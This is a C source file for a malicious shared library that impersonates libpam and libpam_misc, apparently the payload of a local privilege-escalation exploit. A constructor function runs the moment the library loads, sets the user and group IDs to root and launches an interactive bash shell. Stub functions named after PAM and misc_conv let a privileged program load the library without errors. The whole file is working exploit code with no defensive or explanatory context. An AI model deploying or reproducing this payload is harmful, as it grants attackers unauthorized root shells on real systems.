#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

// This library replaces both pam and pam_misc. Make sure to only drop the shell once.
int shell_done = 0;

__attribute__((constructor)) void drop_shell()
{
    if (shell_done) {
        puts("[+] Shell already dropped");
        return;
    }
    shell_done = 1;
    puts("[+] Dropping to shell");

    int rc = setresuid(0, 0, 0);
    rc |= setresgid(0, 0, 0);
    if (rc != 0) {
        perror("setresuid");
        exit(1);
    }

    // Execute interactive bash
    system("/bin/bash");
    _exit(0);
}

#define FAKE_FUCTION(x, y) \
    __attribute__((version(y))) \
    int x() \
    { \
        return 0; \
    }

FAKE_FUCTION(pam_start, "PAM_1.0")
FAKE_FUCTION(pam_set_item, "PAM_1.0")
FAKE_FUCTION(pam_chauthtok, "PAM_1.0")
FAKE_FUCTION(pam_end, "PAM_1.0")
FAKE_FUCTION(pam_strerror, "PAM_1.0")
FAKE_FUCTION(pam_getenvlist, "PAM_1.0")
FAKE_FUCTION(pam_close_session, "PAM_1.0")
FAKE_FUCTION(pam_acct_mgmt, "PAM_1.0")
FAKE_FUCTION(pam_setcred, "PAM_1.0")
FAKE_FUCTION(pam_authenticate, "PAM_1.0")
FAKE_FUCTION(pam_open_session, "PAM_1.0")
FAKE_FUCTION(misc_conv, "LIBPAM_MISC_1.0")
